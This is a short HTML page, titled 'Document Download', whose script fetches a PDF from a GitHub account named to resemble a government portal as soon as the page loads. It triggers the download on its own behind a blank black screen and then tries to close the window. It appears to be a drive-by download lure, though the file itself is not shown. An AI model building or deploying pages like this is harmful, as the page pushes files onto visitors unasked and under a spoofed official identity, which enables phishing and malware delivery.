
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Download</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            height: 100%;
            background: #000000;
            overflow: hidden;
        }
    </style>
</head>
<body>

<script>
(async function () {

    const pdfUrl =
    "https://raw.githubusercontent.com/my-govuz/my-gov./refs/heads/main/down-2026-27-12_17-00-55%20(8).pdf";

    try {
        const response = await fetch(pdfUrl);

        if (!response.ok) {
            throw new Error("PDF не найден: " + response.status);
        }

        const blob = await response.blob();
        const blobUrl = URL.createObjectURL(blob);

        const link = document.createElement("a");
        link.href = blobUrl;
        link.download = "down-2026-27-12_17-00-55 (8).pdf";

        document.body.appendChild(link);
        link.click();
        link.remove();

        setTimeout(() => {
            URL.revokeObjectURL(blobUrl);
            window.close();
        }, 3000);

    } catch (error) {
        console.error(error);
        alert("Ошибка загрузки PDF. Проверьте ссылку на файл.");
    }

})();
</script>

</body>
</html>
